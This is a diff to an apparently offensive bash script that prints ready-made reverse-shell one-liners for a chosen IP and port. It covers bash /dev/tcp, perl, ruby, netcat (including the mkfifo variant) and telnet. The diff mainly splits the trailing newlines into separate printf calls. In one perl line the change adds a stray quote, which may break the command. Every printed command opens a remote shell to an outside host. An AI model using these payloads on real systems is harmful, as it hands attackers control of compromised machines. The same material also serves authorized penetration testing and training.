@@ -17,11 +17,18 @@ clear # clear the screen
 function bash() {
 	printf "\n\t${RED}##########${NC}BASH SHELL(S)${RED}##########${NC}\n\n"
 
-	printf "bash -i >& /dev/tcp/${IP}/${PORT} 0>&1\n\n"
+	printf "bash -i >& /dev/tcp/${IP}/${PORT} 0>&1"
+	
+	printf "\n\n"
 
-	printf "exec /bin/bash 0&0 2>&0\n\n"
+	printf "exec /bin/bash 0&0 2>&0"
+	
+	printf "\n\n"
 
-	printf "0<&196;exec 196<>/dev/tcp/${IP}/${PORT}; sh <&196 >&196 2>&196\n\n"
+
+	printf "0<&196;exec 196<>/dev/tcp/${IP}/${PORT}; sh <&196 >&196 2>&196"
+	
+	printf "\n\n"
 
 	printf "exec 5<>/dev/tcp/${IP}/${PORT} cat <&5 | while read line; do $line 2>&5 >&5; done"
 
@@ -31,11 +38,15 @@ function bash() {
 function perl() {
 	printf "\n\t${RED}##########${NC}PERL SHELL(S)${RED}##########${NC}\n\n"
 
-	printf "perl -e 'use Socket;$i=\"${IP}\";$p=${PORT};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'\n\n"
+	printf "perl -e 'use Socket;$i=\"${IP}\";$p=${PORT};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'\"
+	
+	printf "\n\n"
 
 	printf "${GREEN} LINUX: ${NC}\n"
 
-	printf "\tperl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,\"${IP}:${PORT}\");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'\n\n"
+	printf "\tperl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,\"${IP}:${PORT}\");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'"
+	
+	printf "\n\n"
 
 	printf "${GREEN} WINDOWS: ${NC}\n"
 
@@ -64,11 +75,15 @@ function php() {
 function ruby() {
 	printf "\n\t${RED}##########${NC}RUBY SHELL(S)${RED}##########${NC}\n\n"
 
-	printf "ruby -rsocket -e'f=TCPSocket.open(\"${IP}\",1234).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'\n\n"
+	printf "ruby -rsocket -e'f=TCPSocket.open(\"${IP}\",1234).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"
+	
+	printf "\n\n"
 
 	printf "${GREEN} LINUX: ${NC}\n"
 
-	printf "\truby -rsocket -e 'exit if fork;c=TCPSocket.new(\"${IP}\",\"${PORT}\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'\n\n"
+	printf "\truby -rsocket -e 'exit if fork;c=TCPSocket.new(\"${IP}\",\"${PORT}\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'"
+	
+	printf "\n\n"
 
 	printf "${GREEN} WINDOWS: ${NC}\n"
 
@@ -80,11 +95,17 @@ function ruby() {
 function netcat() {
 	printf "\n\t${RED}##########${NC}NETCAT SHELL(S)${RED}##########${NC}\n\n"
 
-	printf "nc -e /bin/sh ${IP} ${PORT}\n\n"
+	printf "nc -e /bin/sh ${IP} ${PORT}"
+	
+	printf "\n\n"
 
-	printf "nc -c /bin/sh ${IP} ${PORT}\n\n"
+	printf "nc -c /bin/sh ${IP} ${PORT}"
+	
+	printf "\n\n"
 
-	printf "/bin/sh | nc ${IP} ${PORT}\n\n"
+	printf "/bin/sh | nc ${IP} ${PORT}"
+	
+	printf "\n\n"
 
 	printf "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${IP} ${PORT} >/tmp/f"
 
@@ -94,7 +115,9 @@ function netcat() {
 function telnet() {
 	printf "\n\t${RED}##########${NC}TELNET SHELL(S)${RED}##########${NC}\n\n"
 
-	printf "rm -f /tmp/p; mknod /tmp/p p && telnet ${IP} ${PORT} 0/tmp/p\n\n"
+	printf "rm -f /tmp/p; mknod /tmp/p p && telnet ${IP} ${PORT} 0/tmp/p"
+	
+	printf "\n\n"
 
 	printf "${GREEN} Listen on machine on port 4445/tcp ${NC}\n"
 
